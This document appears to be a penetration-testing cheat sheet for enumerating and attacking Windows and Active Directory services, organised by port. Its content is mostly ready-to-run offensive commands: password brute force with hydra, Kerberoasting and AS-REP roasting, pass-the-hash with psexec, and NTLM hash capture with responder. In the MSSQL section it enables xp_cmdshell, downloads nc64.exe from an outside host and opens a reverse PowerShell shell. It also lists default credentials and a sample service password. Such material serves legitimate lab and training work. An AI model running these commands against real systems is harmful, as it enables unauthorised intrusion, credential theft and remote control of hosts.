## Enumeration Checklist

# set your variables

`target=`<br>
`user=`<br>
`pass=`<br>
`ip=`<br>
`domain=`<br>

# 21 FTP

`hydra -l <user list> -P <password list> ftp://$ip`

- common creds patterns<br>
admin/admin<br>
root/root<br>
password/password<br>
username/username<br>


# 53 DNS

`dig @$ip version.bind CHAOS TXT`<br>
`dig axfr @$ip $domain`<br>
`dnsenum $domain`<br>

# 135 RCP

`rpcclient -U '' -N $ip`<br>
`rpcclient -U '$user%$pass' $ip` <br>

- `> enumdomusers      #check the users on the DC`<br>
- `> queryuser <username>  #query the details of the user`<br>
- `> querydispinfo`<br>

`nmblookup -A $ip`<br>

# 445 SMB

**Without Pass**<br>
`enum4linux -a $ip`<br>
`impacket-lookupsid $domain/$user@$domain -no-pass`<br>
`smbmap  -H 10.10.10.100 --depth 10 -r   #List Shares`<br>
`smbclient -N -L //[ip]`<br>
`smbclient //[ip]/[share] -N   #Enumerate Files`<br>


**With Pass**
`lookupsid.py  $domain$user:$pass@$domain`<br>
`lookupsid.py  #domain/$user:$pass@$ip | grep SidTypeUser | cut -d " " -f 2 | cut -d '\' -f 2<br>
> [!IMPORTANT]
> This oneliner will create a file with all the domain users

`psexec.py -hashes  :<ntlm hash>    $user@$ip`<br>
`smbmap -H  hokkaido-aerospace.com -u info -p info --depth 10 -r`<br>
`smbclient //$ip/C$ -U '$user%$pass' -c 'dir'`<br>
`netexec smb [host/ip] -u [user] -p [pass] --shares`<br>
`netexec smb [host/ip] -u guest -p '' --shares`<br>
`smbclient //[ip]/[share] -U [username] [password]`<br>
`netexec smb -u [user] -p [pass] -M spider_plus`<br>
`smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass - Kerberos auth`<br>
`manspider.py --threads 256 [IP/CIDR] -u [username] -p [pass] [options]`<br>


# 88 Kerberoas

`nmap --script=krb5-enum-users --script-args='userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' -p88 $ip`<br>
`kerbrute  -dc $ip -domain $domain -users <user file>   #check if the uses are valid`<br>
`impacket-GetNPUsers $domain/$user -dc-ip $ip   #AS Rep; hashcat module 18200`<br>
`impacket-GetUserSPNs -request -dc-ip $ip $domain/$user  #Kerberoasting; Kerberoasting module 13100`<br>
`kerbrute -domain #domain -dc $ip -users /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt`<br>
`kerbrute -domain $domain -dc $ip  -users /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100`<br>


# 389 LDAP

**Without Pass**<br>
`ldapsearch -H ldap://$ip -x -b "DC=oscp,DC=exam"`<br>
`ldapsearch -x -H ldap://$ip -s base namingcontexts`<br>
`impacket-lookupsid '$domain/guest'@$domain -no-pass`<br>

**With Pass**<br>
`lookupsid.py  $domain/$user:$pass@$domain`<br>
`ldapsearch -x -H ldap://$ip -D '$user' -w '$pass' -s base namingcontexts`<br>

`bloodhound-python -d $domain -u $user -p $pass -c all -ns $ip`<br>
`neo4j console'<br>
> [!IMPORTANT]<br>
> config file; /usr/share/neo4j/conf<br>
`./Bloodhound  --no-sandbox`<br>


# 1433 MSSQL

`impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148 -windows-auth`  #Windows login<br>
`impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148   #user login`<br>

`SELECT @@version   #Current MSSQL Version`<br>
`SELECT DB_NAME()   #Current Database`<br>
`SELECT name FROM sys.databases;  #show DBs`<br>	
`enum_db            #show DBs`<br>
`select * from   <DB name>.INFORMATION_SCHEMA.TABLES  #show tables`<br>

**cmd command**<br>
`EXEC sp_configure 'show advanced options', 1;`<br>
`RECONFIGURE;`<br>
`EXEC sp_configure 'xp_cmdshell', 1;`<br>
`RECONFIGURE;`<br>
`EXEC xp_cmdshell ' whoami /priv'`<br>


**powershell**<br>
`xp_cmdshell "certutil -urlcache -f http://192.168.45.247/nc64.exe nc64.exe"  #If cmd command dose not work, upgrade to poershell`<br>
`xp_cmdshell "powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://10.10.149.147:1235/nc64.exe'',''C:\Windows\Temp\nc64.exe'')"`<br>
`xp_cmdshell "/windows/temp/nc64.exe 10.10.149.147 1234 -e powershell"`<br>


**capture**<br>
`xp_dirtree \\192.168.1.210\shared`<br>
`responder -I tun01`
> [!IMPORTANT]
> When the SQL service is running under a machine account, the authentication process returns the machine account hash, which is not crackable (e.g., $DC)

**impersonate**<br>
`enum_impersonate'<br>  > impersonate`<br>
`EXECUTE AS LOGIN = 'username to impersonate'  #impersonate`<br>
`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`<br>


**MSSQL Cheetsheet**<br>
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
https://kwcsec.gitbook.io/the-red-team-handbook/infrastructure/sql/ms-sql/privilege-escalation
https://www.bordergate.co.uk/attacking-mssql/


# 3389 RDP

`xfreerdp /u:$user /p:$pass /v:$ip /cert:ignore +clipboard`

# 5985 WINRM

`evil-winrm -i $ip -u $user -p $pass`
